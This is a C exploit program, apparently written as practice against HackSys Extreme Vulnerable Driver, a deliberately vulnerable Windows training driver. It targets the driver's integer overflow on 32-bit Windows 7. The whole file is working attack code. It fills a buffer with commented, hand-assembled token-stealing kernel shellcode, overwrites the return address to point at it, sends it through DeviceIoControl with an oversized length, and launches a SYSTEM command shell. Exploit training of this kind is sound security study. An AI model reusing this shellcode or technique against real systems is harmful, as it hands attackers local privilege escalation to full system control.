// Exploit    : HackSys Extreme Vulnerable Driver - Integer Overflow 
// Author     : Hashim Jawad - @ihack4falafel
// OS         : Windows 7 Ultimate (x86) SP1
// Inspired by: Me failing at math in school

#include <stdio.h>
#include <windows.h>

int main() {

	LPCTSTR deviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";        // make sure the character set is set to Unicode under project defaults
	const DWORD iocontrolCode = 0x222027;                                 // found using IDA
	char* inputBuffer;
	DWORD outputBuffer = 0;
	DWORD bytesReturned = 0;
	BOOL ioResult;

	// Create driver handle
	HANDLE hevdDriver = CreateFile(deviceName,             // lpFileName
		GENERIC_READ | GENERIC_WRITE,                  // dwDesiredAccess
		FILE_SHARE_READ | FILE_SHARE_WRITE,            // dwShareMode
		NULL,                                          // lpSecurityAttributes
		OPEN_EXISTING,                                 // dwCreationDisposition
		FILE_ATTRIBUTE_NORMAL,                         // dwFlagsAndAttributes
		NULL                                           // hTemplateFile
	);

	if (hevdDriver == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to grab device handle with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] Driver handle snatched at: 0x%p\n", hevdDriver);

	// Token stealing shellcode
	BYTE shellCode[] = {
		//0xCC, 0xCC, 0xCC, 0xCC,                             // breakpoint
		0x90, 0x90, 0x90, 0x90,                               // nop cushion 
		0x60,                                                 // pushad                           ; backup registers cause it's not as PITA as with x64 arch and i'm lazy ;D
		0x31, 0xC0,                                           // xor eax, eax                     ; zero out eax
		0x64, 0x8B, 0x80, 0x24, 0x01, 0x00, 0x00,             // mov eax, fs:[eax+0x124]          ; move current thread (KTHREAD) into eax (KPCR + 0x120(KPRCB) + 0x004(KTHREAD))           // dt nt!_$ in WinDbg
		0x8B, 0x40, 0x50,                                     // mov eax, [eax+0x50]              ; move current EPROCESS to eax (KTHREAD + 0x40(KAPC_STATE) + 0x010(KPROCESS == EPROCESS)) // dt nt!_$ in WinDbg
		0x89, 0xC1,                                           // mov ecx, eax                     ; make copy of the current process's EPROCESS
		0xBA, 0x04, 0x00, 0x00, 0x00,                         // mov edx,0x4                      ; move SYSTEM PID to rdx
		0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,                   // mov eax, [eax+0xb8]              ; fetch ActiveProcessLinks doubly-linked list (EPROCESS+0x0b8)                             // dt nt!_EPROCESS
		0x2D, 0xB8, 0x00, 0x00, 0x00,                         // sub eax, 0xb8                    ; loop thru the list processes and extract UniqueProcessId (EPROCESS+0x0b4 )               // dt nt!_EPROCESS
		0x39, 0x90, 0xB4, 0x00, 0x00, 0x00,                   // cmp [eax+0xb4],edx               ; until you find SYSTEM PID of 4
		0x75, 0xED,                                           // jne -19                          ; jump 19 bytes backward
		0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00,                   // mov edx,[eax+0xf8]               ; grab SYSTEM's process EPROCESS token
		0x89, 0x91, 0xF8, 0x00, 0x00, 0x00,                   // mov [ecx+0xf8],edx               ; replace the current EPROCESS's token
		0x61,                                                 // popad                            ; restore registers
		0x31, 0xC0,                                           // xor eax, eax                     ; simulate NTSTATUS SUCCESS! 
		0x5D,                                                 // pop ebp                          ; recover Kernel stuff
		0xC2, 0x08, 0x00,                                     // ret 8
	};

	// Allocate user buffer
	inputBuffer = (char *) VirtualAlloc(NULL,               // lpAddress
		2096,                                           // dwSize
		MEM_COMMIT | MEM_RESERVE,                       // flAllocationType
		PAGE_EXECUTE_READWRITE                          // flProtect
	);

	if (!inputBuffer) {
		fprintf(stderr, "[!] Failed to allocate user buffer with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] User buffer has been allocated at: 0x%p\n", inputBuffer);

	// Fill user buffer with As
	RtlFillMemory(inputBuffer, 2096, 'A');                   // Destination, Length, Fill

	fprintf(stdout, "[+] User buffer has been occupied with As\n");

	// Create a pointer to the last 4 bytes of user buffer
	ULONG_PTR terminatorAddress = (ULONG_PTR)(inputBuffer+2092);

	// Update the last 4 bytes of user buffer with magic bytes
	*(DWORD *)terminatorAddress = 0xBAD0B0B0;

	fprintf(stdout, "[+] User buffer last 4 bytes have been updated with terminating bytes\n");

	// Copy token stealing shellcode to user buffer
	memcpy(inputBuffer,                                     // Dst
		shellCode,                                      // Src
		sizeof(shellCode)                               // size of Src
	);

	fprintf(stdout, "[+] User buffer has been occupied with shellcode\n");

	// Create a pointer to the start of user buffer which will effectivly point to the start of the token stealing shellcode
	ULONG_PTR shellcodeAddress = (ULONG_PTR)(inputBuffer);

	// Update EIP with previously created pointer
	*(ULONG_PTR *)(inputBuffer + 2088) = shellcodeAddress;

	fprintf(stdout, "[+] Updating user buffer EIP offset with shellcode pointer\n");

	ioResult = DeviceIoControl(hevdDriver,                  // hDevice
		iocontrolCode,                                  // dwIoControlCode
		inputBuffer,                                    // lpInBuffer
		0xffffffff,                                     // nInBufferSize
		&outputBuffer,                                  // lpOutBuffer
		0,                                              // nOutBufferSize
		&bytesReturned,                                 // lpBytesReturned
		NULL                                            // lpOverlapped
	);

	if (ioResult == FALSE) {
		fprintf(stderr, "[!] Failed to call target driver with error code: %u\n", GetLastError());
		return 1;
	}

	fprintf(stdout, "[+] Device call was successful\n");

	// spawn new cmd.exe as NT AUTHORITY\SYSTEM
	fprintf(stdout, "[+] love me some SYSTEM shell!\n");
	system("cmd.exe");

	// cleanup code
	if (hevdDriver != INVALID_HANDLE_VALUE) {
		CloseHandle(hevdDriver);
	}

	return 0;
}
